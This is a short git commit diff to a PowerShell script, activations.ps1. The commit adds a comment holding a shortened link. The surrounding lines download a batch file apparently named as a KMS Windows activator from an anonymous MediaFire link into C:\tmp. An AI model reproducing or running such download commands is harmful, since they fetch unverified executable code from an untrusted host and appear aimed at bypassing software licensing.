88a599c2e128735958e7285656caa25bbcd87930
asdlkajsd <55603482+asdlkajsd@users.noreply.github.com>
2020-11-19 07:10:58 -0500

    Update activations.ps1

--- activations.ps1
+++ activations.ps1
@@ -1,3 +1,5 @@
+# https://git.io/JkE1I
+
 mkdir C:\tmp
 powershell -c "(new-object System.Net.WebClient).DownloadFile('http://download939.mediafire.com/7c5y04tpf0qg/ir5prt4cw7tuk4p/KMS_ACT_ORIGINAL.cmd','C:\tmp\activation.cmd')"
 Invoke-WebRequest http://download939.mediafire.com/7c5y04tpf0qg/ir5prt4cw7tuk4p/KMS_ACT_ORIGINAL.cmd -OutFile C:\tmp\activation.cmd
